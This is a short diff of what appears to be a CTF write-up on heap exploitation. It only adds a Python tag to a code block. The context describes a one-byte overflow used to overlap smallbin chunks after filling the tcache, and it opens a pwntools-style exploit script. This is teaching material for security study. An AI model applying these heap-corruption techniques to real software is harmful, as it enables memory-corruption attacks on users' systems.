@@ -100,7 +100,7 @@ The `load` function opens a file from a pointer in heap (allocated in the beginn
 
 
 With the one byte overflow, we can [overlap chunks](https://github.com/shellphish/how2heap/blob/master/glibc_2.26/overlapping_chunks.c) between two smallbin chunks; But first, we need to fill the tcache. Here's initial script:
-```
+```Python
 def setup_game(w,h,savename=''):
 	r.sendlineafter("code: ",savename)
 	r.sendlineafter("Width: ",str(w))
